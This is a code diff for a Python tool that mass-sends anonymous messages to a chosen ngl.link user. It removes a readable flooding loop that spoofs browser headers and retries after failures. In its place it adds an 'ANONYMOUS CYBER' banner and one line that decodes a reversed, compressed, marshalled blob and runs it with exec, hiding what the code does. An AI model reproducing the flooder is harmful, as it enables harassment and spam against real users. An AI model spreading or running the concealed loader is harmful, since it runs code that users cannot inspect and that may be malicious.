@@ -1,69 +1,7 @@
-import requests
-import os
-from pystyle import Colors, Colorate
-import time
-
-def ngl():
-    
-    R = '\033[31m'
-    G = '\033[32m'
-    W = '\033[0m'
-
-    os.system('cls' if os.name == 'nt' else 'clear')
-
-    print(Colorate.Vertical(Colors.blue_to_purple,"""
-╭━╮╱╭┳━━━┳╮╱╱╱╭━━━┳━━━┳━━━┳━╮╭━╮
-┃┃╰╮┃┃╭━╮┃┃╱╱╱┃╭━╮┃╭━╮┃╭━╮┃┃╰╯┃┃
-┃╭╮╰╯┃┃╱╰┫┃╱╱╱┃╰━━┫╰━╯┃┃╱┃┃╭╮╭╮┃
-┃┃╰╮┃┃┃╭━┫┃╱╭╮╰━━╮┃╭━━┫╰━╯┃┃┃┃┃┃
-┃┃╱┃┃┃╰┻━┃╰━╯┃┃╰━╯┃┃╱╱┃╭━╮┃┃┃┃┃┃
-╰╯╱╰━┻━━━┻━━━╯╰━━━┻╯╱╱╰╯╱╰┻╯╰╯╰╯
-    """))
-
-    nglusername = input(Colorate.Vertical(Colors.blue_to_purple,"Username: "))
-    message = input(Colorate.Vertical(Colors.blue_to_purple,"Message: "))
-    Count = int(input(Colorate.Vertical(Colors.blue_to_purple,"Count:")))
-
-    print(Colorate.Vertical(Colors.green_to_blue,"**********************************************************"))
-
-    value =0
-    notsend =0
-    while value < Count:
-        headers = {
-            'Host': 'ngl.link',
-            'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
-            'accept': '*/*',
-            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-            'x-requested-with': 'XMLHttpRequest',
-            'sec-ch-ua-mobile': '?0',
-            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
-            'sec-ch-ua-platform': '"Windows"',
-            'origin': 'https://ngl.link',
-            'sec-fetch-site': 'same-origin',
-            'sec-fetch-mode': 'cors',
-            'sec-fetch-dest': 'empty',
-            'referer': f'https://ngl.link/{nglusername}',
-            'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
-        }
-
-        data = {
-            'username': f'{nglusername}',
-            'question': f'{message}',
-            'deviceId': '0',
-            'gameSlug': '',
-            'referrer': '',
-        }
-
-        response = requests.post('https://ngl.link/api/submit',headers=headers, data=data)
-        if response.status_code == 200:
-            notsend = 0
-            value += 1
-            print(G+"[+]"+W+"Send =>"+G+"{}".format(value)+W)
-        else:
-            notsend += 1
-            print(R+"[-]"+W+"Not Send")
-        if notsend == 10:
-            print(R+"[!]"+W+"Wait 5 Seconds")
-            time.sleep(5)
-            notsend = 0
-ngl()
+#_____________________| INFO  |______________________#
+# TEAM : ANONYMOUS CYBER
+# PYTHON VERSION : 3.11
+# GITHUB : https://github.com/YUKI
+# TIME  : Fri Mar 22 02:41:28 2024
+#__________________| MAIN MENU  |__________________#
+_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));exec((_)(b'=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'))
